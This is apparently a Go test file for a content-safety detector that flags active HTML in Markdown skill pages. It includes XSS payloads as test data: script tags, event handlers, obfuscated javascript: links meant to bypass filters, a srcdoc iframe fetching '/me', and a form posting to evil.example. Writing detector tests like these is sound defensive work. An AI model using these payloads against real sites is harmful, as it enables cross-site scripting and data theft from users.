package contentsafety

import (
	"strings"
	"testing"
)

func activeHTMLFound(path, content string) bool {
	var r Result
	DetectFile(&r, path, content, ActiveHTML)
	return r.Severity == SeverityCritical && findingIDs(r.Findings)[activeHTMLRuleID]
}

// The payloads used against skill pages on 2026-11-02, the bypasses found in
// review, and markup that is only shown as code.
func TestDetect_activeHTML(t *testing.T) {
	hostile := map[string]string{
		"srcdoc iframe":         "Control: <b>X</b>\n\n<iframe srcdoc=\"&lt;script&gt;fetch('/me')&lt;/script&gt;\"></iframe>",
		"script":                "<script>alert(1)</script>",
		"img onerror":           "<img src=x onerror=\"alert(1)\">",
		"svg onload":            "<svg/onload=alert(1)>",
		"object":                "<object data=\"x.html\"></object>",
		"embed":                 "<EMBED src=x>",
		"style":                 "<style>body{display:none}</style>",
		"form other origin":     "<form action=\"https://evil.example/collect\"><input name=q></form>",
		"js link":               "[click](javascript:alert(1))",
		"js href":               "<a href=\"javascript:alert(1)\">x</a>",
		"entity js href":        "<a href=\"jav&#x61;script:alert(1)\">x</a>",
		"tab js href":           "<a href=\"java\tscript:alert(1)\">x</a>",
		"entity LF js href":     "<a href=\"jav&#x0A;ascript:alert(1)\">x</a>",
		"entity CR js href":     "<a href=\"jav&#13;ascript:alert(1)\">x</a>",
		"multiline onerror":     "<img src=x\nonerror=alert(1)>",
		"multiline js href":     "<a href=\"java\nscript:alert(1)\">x</a>",
		"reference definition":  "[docs][1]\n\n[1]: javascript:alert(1)",
		"autolink":              "<javascript:alert(1)>",
		"meta refresh":          "<meta http-equiv=\"refresh\" content=\"0;url=https://evil\">",
		"after code span":       "use `x` then <script>alert(1)</script>",
		"mismatched code run":   "``x` <script>alert(1)</script>",
		"backtick in info":      "```foo`\n<script>alert(1)</script>",
		"unclosed fence opener": "<script>alert(1)</script>\n```",
	}
	for name, content := range hostile {
		if !activeHTMLFound("SKILL.md", content) {
			t.Errorf("%s: not flagged", name)
		}
	}

	benign := map[string]string{
		"fenced":          "```html\n<script src=\"app.js\"></script>\n<iframe src=x></iframe>\n```",
		"tilde fenced":    "~~~\n<img src=x onerror=alert(1)>\n~~~",
		"inline code":     "Add `<script>` to the page and `onclick=` handlers.",
		"double backtick": "Use ``<script>` tags`` carefully.",
		"json example":    "```json\n{\"prompt\": \"<script>\"}\n```",
		"prose":           "Run custom JavaScript: in the console, and use the onboarding flow.",
		"plain html":      "<b>bold</b> <details><summary>more</summary>text</details> <img src=\"https://x/y.png\" alt=\"y\">",
		"md link":         "[docs](https://inference.sh/docs)\n\n[1]: https://inference.sh",
		"word on":         "Turn <b>on</b> = enabled",
		"same-site form":  "<form action=\"/search\"><input name=q></form>",
	}
	for name, content := range benign {
		var r Result
		DetectFile(&r, "SKILL.md", content, ActiveHTML)
		if len(r.Findings) != 0 {
			t.Errorf("%s: false positive: %+v", name, r.Findings)
		}
	}
}

// HTML, SVG and extensionless files are markup as written: backticks and
// fences mean nothing there. Code files are not rendered.
func TestDetect_activeHTMLByFileKind(t *testing.T) {
	fenced := "```\n<script>alert(1)</script>\n```"
	for _, p := range []string{"page.html", "x.htm", "icon.svg", "LICENSE"} {
		if !activeHTMLFound(p, fenced) {
			t.Errorf("%s: fenced script not flagged", p)
		}
	}
	if activeHTMLFound("README.md", fenced) {
		t.Error("README.md: fenced script flagged")
	}
	if activeHTMLFound("scripts/render.js", "el.innerHTML = '<script>x</script>'") {
		t.Error("scripts/render.js: code file flagged")
	}
}

// ActiveHTML is opt-in: the resolve and store gates scan with AllRules and
// must not start failing on markup.
func TestAllRulesExcludesActiveHTML(t *testing.T) {
	if AllRules&ActiveHTML != 0 {
		t.Fatal("AllRules includes ActiveHTML")
	}
	r := Detect("<iframe srcdoc=\"x\"></iframe>", AllRules)
	for _, f := range r.Findings {
		if strings.HasPrefix(f.RuleID, activeHTMLRuleID) {
			t.Fatalf("AllRules reported %s", f.RuleID)
		}
	}
}
